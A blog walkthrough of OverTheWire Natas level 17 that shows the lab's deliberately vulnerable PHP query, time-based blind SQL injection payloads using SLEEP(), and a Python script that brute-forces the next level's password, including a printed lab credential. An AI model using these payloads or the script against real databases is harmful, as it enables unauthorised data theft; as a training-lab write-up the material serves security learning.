---
title: "Overthewire Natas 17 Walkthrough"
layout: post
date: 2018-05-3 21:44
image: /assets/images/markdown.jpg
headerImage: false
tag:
- ctf
- overthewire
- natas
- wargames
star: true
category: blog
author: Hisham Alshaikh
description: This is just a walkthrough for overthewire's natas level 17
---

## Challenge

![Markdown Image](/assets/images/natas_17_solution/challenge_page.png)

{% highlight php %}
<? 
/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 

if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas17', '<censored>'); 
    mysql_select_db('natas17', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    $res = mysql_query($query, $link); 
    if($res) { 
    if(mysql_num_rows($res) > 0) { 
        //echo "This user exists.<br>"; 
    } else { 
        //echo "This user doesn't exist.<br>"; 
    } 
    } else { 
        //echo "Error in query.<br>"; 
    } 

    mysql_close($link); 
} else { 
?> 
{% endhighlight %}

The goal of this challenge is to exploit a blind SQL injection vulnerability in order the to read the 'password' column for the username natas18, so we obtain the password for the next level. 


## Solution


Reading the source code we can find out that we have control over the username field in the SQL query. We can do a proof of concept that this blind sql injection works by using SLEEP() function; we will know it works if it took a longer time to respone.

{% highlight raw %}
natas18" and sleep(5)#
{% endhighlight %}


Now we can do the same sleep() technique in order to know the characters in the password. So we will send a query for querying some character in the password field, and if it exists a delay will happen, if not nothing will happen. 

{% highlight raw %}
natas18" AND IF(password LIKE BINARY "%0%", SLEEP(100), null) #
{% endhighlight %}


Now we can automate all of this proccess of getting natas18 password using the following python script.

{% highlight python %}
#!/usr/bin/python
#h15h4m


import requests
from requests.auth import HTTPBasicAuth


http_username = "natas17"
http_password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
target =  "http://natas17.natas.labs.overthewire.org/"
http_login=HTTPBasicAuth(http_username, http_password)
chars_to_check = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
password_chars_found = ''
password = ''
r = requests.get(target, auth=http_login)

if  r.status_code != requests.codes.ok:
    print "[-] Check Authentication"
    exit()


print "[!] We are in"



#natas18" AND IF(password LIKE BINARY "%0%", SLEEP(100), null) #

for i in chars_to_check:
    payload = 'natas18" AND IF(password LIKE BINARY "%'+ i +'%", SLEEP(5), null) %23'
    try:
        r = requests.get(target + "index.php?debug=1&username=" + payload, auth=http_login,timeout=1)
    except:
        print "[+] Timeout: Char Found " + i
        password_chars_found += i

print '[!] Found Chars ' + password_chars_found

#md5 32 chars
for i in range(32):
    for ii in password_chars_found:
        payload = 'natas18" AND IF(password LIKE BINARY "'+ password + ii +'%", SLEEP(5), null) %23'
        try:
            r = requests.get(target + "index.php?debug=1&username=" + payload, auth=http_login,timeout=1)
        except:
            print "[+] Timeout: Char Found " + ii
            password += ii
            break


print '[!] PASSWORD = ' + password

#print r.content
{% endhighlight %}



![Markdown Image](/assets/images/natas_17_solution/final_result.png)


